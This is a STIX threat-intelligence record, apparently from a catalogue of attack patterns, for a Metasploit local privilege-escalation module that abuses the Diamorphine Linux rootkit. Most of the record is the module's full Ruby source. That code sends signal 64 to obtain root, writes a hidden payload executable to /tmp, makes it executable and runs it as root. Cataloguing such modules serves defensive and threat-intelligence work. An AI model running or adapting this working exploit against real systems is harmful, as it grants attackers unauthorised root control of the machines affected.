{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--0beb6e0e-5fe8-4fb8-8a5d-98eb5d65f9a4",
    "created": "2024-08-14T16:59:31.863393Z",
    "modified": "2024-08-14T16:59:31.863397Z",
    "name": "Diamorphine Rootkit Signal Privilege Escalation",
    "description": " This module uses Diamorphine rootkit's privesc feature using signal 64 to elevate the privileges of arbitrary processes to UID 0 (root).  This module has been tested successfully with Diamorphine from `master` branch (2019-10-04) on Linux Mint 19 kernel 4.15.0-20-generic (x64).  'License'        => MSF_LICENSE",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/exploits/linux/local/diamorphine_rootkit_signal_priv_esc.rb",
            "external_id": "diamorphine_rootkit_signal_priv_esc.rb"
        },
        {
            "source_name": "reference",
            "url": "https://github.com/m0nad/Diamorphine"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Exploit::Local\n  Rank = ExcellentRanking\n\n  include Msf::Post::File\n  include Msf::Post::Linux::Priv\n  include Msf::Post::Linux::System\n  include Msf::Exploit::EXE\n  include Msf::Exploit::FileDropper\n  prepend Msf::Exploit::Remote::AutoCheck\n\n  def initialize(info = {})\n    super(update_info(info,\n      'Name'           => 'Diamorphine Rootkit Signal Privilege Escalation',\n      'Description'    => %q{\n        This module uses Diamorphine rootkit's privesc feature using signal\n        64 to elevate the privileges of arbitrary processes to UID 0 (root).\n\n        This module has been tested successfully with Diamorphine from `master`\n        branch (2019-10-04) on Linux Mint 19 kernel 4.15.0-20-generic (x64).\n      },\n      'License'        => MSF_LICENSE,\n      'Author'         =>\n        [\n          'm0nad', # Diamorphine\n          'bcoles' # Metasploit\n        ],\n      'DisclosureDate' => '2013-11-07', # Diamorphine first public commit\n      'References'     =>\n        [\n          ['URL', 'https://github.com/m0nad/Diamorphine']\n        ],\n      'Platform'       => ['linux'],\n      'Arch'           => [ARCH_X86, ARCH_X64],\n      'SessionTypes'   => ['shell', 'meterpreter'],\n      'Targets'        => [['Auto', {}]],\n      'Notes'          =>\n        {\n          'Reliability' => [ REPEATABLE_SESSION ],\n          'Stability'   => [ CRASH_SAFE ]\n        },\n      'DefaultTarget'  => 0))\n    register_options [\n      OptInt.new('SIGNAL', [true, 'Diamorphine elevate signal', 64])\n    ]\n    register_advanced_options [\n      OptString.new('WritableDir', [true, 'A directory where we can write files', '/tmp'])\n    ]\n  end\n\n  def signal\n    datastore['SIGNAL'].to_s\n  end\n\n  def base_dir\n    datastore['WritableDir'].to_s\n  end\n\n  def upload_and_chmodx(path, data)\n    print_status \"Writing '#{path}' (#{data.size} bytes) ...\"\n    write_file path, data\n    chmod path, 0755\n  end\n\n  def cmd_exec_elevated(cmd)\n    vprint_status \"Executing #{cmd} ...\"\n    res = cmd_exec(\"sh -c 'kill -#{signal} $$ && #{cmd}'\").to_s\n    vprint_line res unless res.blank?\n    res\n  end\n\n  def check\n    res = cmd_exec_elevated 'id'\n\n    if res.include?('invalid signal')\n      return CheckCode::Safe(\"Signal '#{signal}' is invalid\")\n    end\n\n    unless res.include?('uid=0')\n      return CheckCode::Safe(\"Diamorphine is not installed, or incorrect signal '#{signal}'\")\n    end\n\n    CheckCode::Vulnerable(\"Diamorphine is installed and configured to handle signal '#{signal}'.\")\n  end\n\n  def exploit\n    if !datastore['ForceExploit'] && is_root?\n      fail_with(Failure::BadConfig, 'Session already has root privileges. Set ForceExploit to override.')\n    end\n\n    unless writable? base_dir\n      fail_with Failure::BadConfig, \"#{base_dir} is not writable\"\n    end\n\n    payload_name = \".#{rand_text_alphanumeric 8..12}\"\n    payload_path = \"#{base_dir}/#{payload_name}\"\n    upload_and_chmodx payload_path, generate_payload_exe\n    register_file_for_cleanup payload_path\n\n    cmd_exec_elevated \"#{payload_path} & echo \"\n  end\nend\n",
    "x_mitre_disclosure_date": "2013-11-07, # Diamorphine first public commit",
    "x_mitre_platforms": [
        "['linux']"
    ]
}